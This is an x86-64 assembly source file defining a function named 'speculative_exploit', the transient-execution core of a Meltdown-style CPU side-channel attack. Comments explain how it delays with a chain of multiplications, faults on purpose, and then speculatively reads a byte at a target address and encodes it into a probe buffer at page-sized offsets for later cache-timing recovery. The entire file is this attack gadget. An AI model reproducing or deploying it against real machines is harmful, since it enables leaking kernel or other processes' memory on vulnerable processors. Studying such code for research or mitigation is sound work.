.intel_syntax noprefix
.global speculative_exploit

speculative_exploit:
    # rdi = target address to leak
    # rsi = encoding buffer base address
    xor rcx, rcx
    mov rbx, rsi

    # This is the first dependent group of
    # instructions. It's only purpose is to be
    # slow and cause the CPU to increase the
    # chance of speculatively execute the
    # next dependent chain of instructions.
    mov rax, rdi
    .rept 200
        imul rax, rax
    .endr
    mov rax, [rax]            # Intentional fault by dereferencing an invalid address

    # These instructions will never effectively
    # execute, but can be speculatively executed
    # as transient instructions while the CPU is
    # waiting for the slow dependent chain of
    # instructions above to complete.
    mov cl, byte ptr [rdi]
    shl rcx, 12
    add rbx, rcx
    mov rbx, [rbx]
    ret

.section .note.GNU-stack,"",@progbits

